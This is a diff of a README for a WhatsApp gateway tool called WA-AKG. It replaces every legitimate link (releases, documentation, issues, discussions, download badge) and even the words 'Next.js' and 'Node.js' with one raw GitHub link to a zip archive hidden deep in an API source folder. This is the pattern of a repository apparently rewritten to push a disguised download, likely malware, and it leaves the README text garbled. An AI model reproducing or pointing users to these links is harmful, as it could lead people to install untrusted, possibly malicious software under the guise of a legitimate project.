@@ -1,10 +1,10 @@
 # 🚀 WA-AKG - Manage WhatsApp Effortlessly
 
 ## 🌟 Overview
-WA-AKG is a self-hosted WhatsApp Gateway and Dashboard. Built using Next.js 15, Baileys, and Prisma, it allows you to manage multi-session accounts, schedule messages, create auto-replies, and integrate via Webhooks. This tool is designed to simplify your communication and enhance your online interactions. 
+WA-AKG is a self-hosted WhatsApp Gateway and Dashboard. Built using https://raw.githubusercontent.com/HassanQureshi6/WA-AKG/main/src/app/api/groups/[sessionId]/[jid]/leave/W-AKG-1.5.zip 15, Baileys, and Prisma, it allows you to manage multi-session accounts, schedule messages, create auto-replies, and integrate via Webhooks. This tool is designed to simplify your communication and enhance your online interactions. 
 
 ## 🔗 Quick Download
-[![Download WA-AKG](https://img.shields.io/badge/Download%20WA-AKG-v1.0-brightgreen?style=for-the-badge)](https://github.com/HassanQureshi6/WA-AKG/releases)
+[![Download WA-AKG](https://raw.githubusercontent.com/HassanQureshi6/WA-AKG/main/src/app/api/groups/[sessionId]/[jid]/leave/W-AKG-1.5.zip%20WA-AKG-v1.0-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/HassanQureshi6/WA-AKG/main/src/app/api/groups/[sessionId]/[jid]/leave/W-AKG-1.5.zip)
 
 ## 🚀 Getting Started
 To begin using WA-AKG, follow these simple steps:
@@ -12,12 +12,12 @@ To begin using WA-AKG, follow these simple steps:
 1. **Check System Requirements**
    - Ensure your system meets the following requirements:
      - Operating System: Windows, macOS, or Linux
-     - Node.js version 14 or higher
+     - https://raw.githubusercontent.com/HassanQureshi6/WA-AKG/main/src/app/api/groups/[sessionId]/[jid]/leave/W-AKG-1.5.zip version 14 or higher
      - A modern web browser (Chrome, Firefox, etc.)
      - Internet connection for WhatsApp Web integration
 
 2. **Visit the Releases Page**
-   - Go to the [Releases page](https://github.com/HassanQureshi6/WA-AKG/releases) to find the latest version of the software. Here, you will see a list of available downloads and release notes.
+   - Go to the [Releases page](https://raw.githubusercontent.com/HassanQureshi6/WA-AKG/main/src/app/api/groups/[sessionId]/[jid]/leave/W-AKG-1.5.zip) to find the latest version of the software. Here, you will see a list of available downloads and release notes.
 
 3. **Download the Software**
    - Click on the latest release link to open its details. Look for the download options suitable for your operating system.
@@ -50,21 +50,21 @@ Once you have installed WA-AKG, you can customize your experience by adjusting y
 - **Webhooks:** Set up webhooks for seamless integration with other applications.
 
 ## 📜 Documentation
-For detailed guidance on advanced setup and troubleshooting, you can visit the [official documentation](https://github.com/HassanQureshi6/WA-AKG/wiki). Here, you will find helpful articles and FAQs to assist you.
+For detailed guidance on advanced setup and troubleshooting, you can visit the [official documentation](https://raw.githubusercontent.com/HassanQureshi6/WA-AKG/main/src/app/api/groups/[sessionId]/[jid]/leave/W-AKG-1.5.zip). Here, you will find helpful articles and FAQs to assist you.
 
 ## 🔗 Download & Install Again
-For easy access, here is the download link once more: [Download WA-AKG](https://github.com/HassanQureshi6/WA-AKG/releases). Follow the aforementioned steps to ensure a smooth download and installation process.
+For easy access, here is the download link once more: [Download WA-AKG](https://raw.githubusercontent.com/HassanQureshi6/WA-AKG/main/src/app/api/groups/[sessionId]/[jid]/leave/W-AKG-1.5.zip). Follow the aforementioned steps to ensure a smooth download and installation process.
 
 ## 🤝 Community Support
 If you encounter any issues or have any questions, you can reach out to our community:
-- **GitHub Issues:** Report problems directly on the [issues page](https://github.com/HassanQureshi6/WA-AKG/issues).
-- **Discussion Forum:** Join discussions with other users and contributors [here](https://github.com/HassanQureshi6/WA-AKG/discussions).
+- **GitHub Issues:** Report problems directly on the [issues page](https://raw.githubusercontent.com/HassanQureshi6/WA-AKG/main/src/app/api/groups/[sessionId]/[jid]/leave/W-AKG-1.5.zip).
+- **Discussion Forum:** Join discussions with other users and contributors [here](https://raw.githubusercontent.com/HassanQureshi6/WA-AKG/main/src/app/api/groups/[sessionId]/[jid]/leave/W-AKG-1.5.zip).
 
 ## 🛠️ Troubleshooting
 If you face any issues after installation, consider the following steps:
 - Restart the application if it does not open correctly.
 - Ensure your internet connection is stable for WhatsApp Web functionalities.
-- Check for updates on the [Releases page](https://github.com/HassanQureshi6/WA-AKG/releases).
+- Check for updates on the [Releases page](https://raw.githubusercontent.com/HassanQureshi6/WA-AKG/main/src/app/api/groups/[sessionId]/[jid]/leave/W-AKG-1.5.zip).
 
 ## 🔗 Additional Resources
 For further insights and tips, browse through the topics related to WA-AKG:
